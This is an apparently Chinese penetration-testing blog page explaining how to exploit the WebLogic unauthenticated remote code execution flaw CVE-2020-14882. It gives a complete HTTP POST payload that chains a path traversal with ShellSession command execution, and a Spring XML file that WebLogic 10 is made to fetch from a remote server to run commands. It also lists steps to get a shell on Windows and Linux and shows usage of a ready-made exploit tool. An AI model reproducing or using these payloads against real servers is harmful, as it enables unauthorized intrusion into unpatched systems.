<!DOCTYPE html>
<html>
  <!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  
  <title>Weblogic未授权RCE利用（CVE-2020-14882） - x51</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
  
  <meta name="keywords" content=渗透测试,内网渗透,红蓝对抗>
  
    <meta name="description" content="与其感叹路难行，不如马上出发。">
  
  
    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.02">
  
  

  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 4.2.1"></head>
  <body>
    <div class="container">
      <header class="header">
  <div class="blog-title">
    <a href="/" class="logo">x51</a>
    <div class="subtitle">与其感叹路难行，不如马上出发.</div>
  </div>
  <nav class="navbar">
    <ul class="menu">
      
        <li class="menu-item">
          <a href="/" class="menu-item-link">主页</a>
        </li>
      
        <li class="menu-item">
          <a href="/archives" class="menu-item-link">归档</a>
        </li>
      
        <li class="menu-item">
          <a href="/tools" class="menu-item-link">Tools</a>
        </li>
      
        <li class="menu-item">
          <a href="/about" class="menu-item-link">关于</a>
        </li>
      
    </ul>
  </nav>
</header>
<article class="post">
  <div class="post-title">
    <h1 class="article-title">Weblogic未授权RCE利用（CVE-2020-14882）</h1>
  </div>
   <div class="post-meta">
    <span class="post-time">2020-10-31</span>
  </div>
  <div class="post-content">
    <p>漏洞分析：<br><a href="https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf">https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf</a></p>
<p>网上已经有大量的Poc效果，大部分基于Weblogic 12，并且有大佬构造出了带回显的命令执行，主要用到的Payload：  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/console/css/%252E%252E%252Fconsole.portal</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxxx</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 134</span><br><span class="line"></span><br><span class="line">_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22)</span><br></pre></td></tr></table></figure>
<p>然而Weblogic 10没有这东西：  </p>
<p><img src="/images/pasted-147.png" alt="upload successful"><br>在目标可出网的情况下利用<br><code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext()</code><br>来加载远程XML文件<br><img src="/images/pasted-148.png" alt="upload successful"><br><em>x51.xml</em></p>
<pre><code>&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
xsi:schemaLocation=&quot;
http://www.springframework.org/schema/beans
http://www.springframework.org/schema/beans/spring-beans.xsd
&quot;&gt;
&lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;
&lt;constructor-arg&gt;
&lt;list&gt;
&lt;value&gt;xxx&lt;/value&gt;
&lt;/list&gt;
&lt;/constructor-arg&gt;
&lt;/bean&gt;
&lt;/beans&gt;</code></pre><h4 id="获取Shell"><a href="#获取Shell" class="headerlink" title="获取Shell"></a>获取Shell</h4><p>1、Windows下可用Powershell远程加载；<br>2、Linux下可以分多次运行，写入代码到/tmp/x51，修改权限，运行;<br>目标为Linux时利用成功截图：  </p>
<p><img src="/images/pasted-149.png" alt="upload successful">  </p>
<h4 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h4><p>命令行下利用：</p>
<pre><code>cve202014882.exe http://target/ comand</code></pre><p><img src="/images/pasted-150.png" alt="upload successful"> </p>

  </div>
  <div class="post-footer">
    

    <a href="#top" class="top">返回顶部</a>
  </div>
</article>
<footer>
  &copy; 2020
  <span class="author">
    x51
  </span>
</footer>
    </div>
  </body>
</html>